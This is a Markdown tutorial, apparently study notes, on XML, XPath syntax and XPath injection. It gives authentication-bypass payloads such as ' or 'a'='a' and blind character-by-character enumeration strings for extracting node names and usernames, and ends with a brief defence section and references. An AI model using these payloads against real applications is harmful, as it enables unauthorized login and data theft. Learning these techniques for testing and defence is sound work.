
# XPath

## XML Documents and databases

Extensible markup language (XML) v1.0 is a markup language (such as HTML) mainly designed to describe data and not to display it.

Due to their nature, XML documents are often used as databases. Data can be read and written through queries, and the XML database looks like an XML documuent.

```xml
<?xml version="1.0" encoding="ISO-8859-1" ?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"></xs:schema>
```

## XML declaration

The first line of the document is the XML declaration. It is not required but if it does exist it must be the first line in the document.

```
<?xml version="1.0" encoding="ISO-8859-1" ?>
```

Then there is typically a root element for example:

```xml
<users>
</users>
```

In contrast to HTML, you can use any naming convention you wish for elements; as long as they follow these simple naming rules...

* Names must start with a letter or underscore;
* The name cannot start with the letters `xml`
* Names are case sensitive
* Names can contain letters, digits, full stops but no spaces

## Attributes

```xml
<user id=`1`>
```
Elements can have attributes, in this example the user element has the attribute  id   set to  `1`.

## elements with a value

```xml
<username>monz</username>
```
This element contains text (instead of a child element). The text is considered to the value of the element.

## comments

```xm
<!-- Comment -->
```

## XPath

XPath (XML Path Language) is a standard language used to query and navigate XML documents. 

XPath makes use of path expressions to select nodes from an XML document.

## XPath query example

```
//user[username/text()='<USERNAME>' and password/text()='<PASSWORD>']
```

Where `<USERNAME>` and `<PASSWORD` are input values, inserted by the user, therefore, they should be sanitized before being used.

## XPath syntax

* `/:` select the document node
* `//` select all nodes (that match the selection)
* `node_name:` selects all teh nodes with specified node_name
* `@` i.e /@id to select all attributes named id
* [element or condition]: select all nodes that match

## XPath queries

### Get all users
```
//user
```
### Get child elements

 ```
 /users//username
 ```
### Get by id attribute
```
//user[@id='1']/username
```
### Get by attribute value
```
//user[username/text()='monz' and password/text()='pass']
```

## SQL Differences

* XPath does not permit comment expressions
* XPath is case sensitive

## Probing XPath
You can probe for XPath injections using...
* ` -- Apostrophe used as a string terminator
* , -- Comma, used to break integers (although any character would work)

In some cases you can discover the original XPath query in error messages.

## Blind injection

In a blind injection you try TRUE and FALSE conditions. Using always true and always false statements like 1=1 & 1=2.

If the application is vulnerable you should be able to check for differences in the application to determine success.
## injecting an always true statement via a URL query
```
?countryID=9999 or 1=1
```
Will most likely show either the first or last entry if successful.

## Try an always false statement
```
?countryID=9999 or 1=2
```
Will hopefully have a different response and you can confirm XPath injection exists.

## Exploiting XPath injection

A successful injection can lead information disclosure (downloading the entire xml document and contents) and possibly allow further attacks like bypassing authentication.

## Exploiting an XPath query

There is a login form...

```
username ____________
password ____________
login

```

This generates an XPath authentication query...

```
<someNode>[username='<USERNAME>' and passord='<PASSWORD>']
```
Both conditions must be verified to authenticate.

## Exploiting
Payload
```
' or 'a'='a' or 'a'= 'a
```
Resulting query
```
//<someNode>[username='' or 'a'='a' or 'a'='a' and password = '']
```

## Or using the password parameter

Payload
```
' or 'a'= 'a
```
With the resulting XPath query
```
//<someNode>[username='' and password='' or 'a'='a']
```

## Another example 

```
<users>
  <user>
    <username>monz</username>
    <password>pass</password>
  </user>
  ...
</users>
```

This document structure is hidden and a BLIND technique must be used.

## Useful statements

```
*[1]                              | Returns the root node

name(*[1])                        | Returns the identifier of the root node
name(/users/*[1])                 | Returns identifier for first child
/users/user[position()=1/username | Selects username of the first user node
Substring('label',1,1)            | Returns the first character of the label string   
```

## Finding out the root node identifier
Using blind inference and iteration... check the first character
```
' or substring(name(/*[1]),1,1)='a
' or substring(name(/*[1]),1,1)='b
' or substring(name(/*[1]),1,1)='c
```

Then the second character and so on...

```
' or substring(name(/*[1]),2,1)='a
' or substring(name(/*[1]),2,1)='b
' or substring(name(/*[1]),2,1)='c
```
This technique is used to get the root identifier: `users` and teh child node `user`:

```xml
<users>
 <user></user>
</users>
```
Having enumerated all node identifierd create queries...

```
/users/user[position()==$1]/username
```
Where $1 is a numerical placeholder (that you can iterate and discover every username in the system)...

```
'or substring(/users/user[position()=1]/username,1,1)='a
'or substring(/users/user[position()=1]/username,1,1)='b
'or substring(/users/user[position()=1]/username,1,1)='c
```

## Defences

Always filter input data before providing it to XPath queries.

* filter out non-alphanumerical characters

## References

* http://www.w3.org/XML/
* https://msdn.microsoft.com/en-us/library/ms256177(v=vs.110).aspx
* https://www.w3schools.com/xml/xpath_syntax.asp
* http://code.google.com/p/xpath-blind-explorer/
* http://www.w3schools.com/xml/default.asp
* http://www.w3.org/TR/xpath-30/
* https://msdn.microsoft.com/en-us/library/ms256086(v=vs.110).aspx
* https://github.com/orf/xcat
* https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)
* https://www.owasp.org/index.php/Blind_XPath_Injection
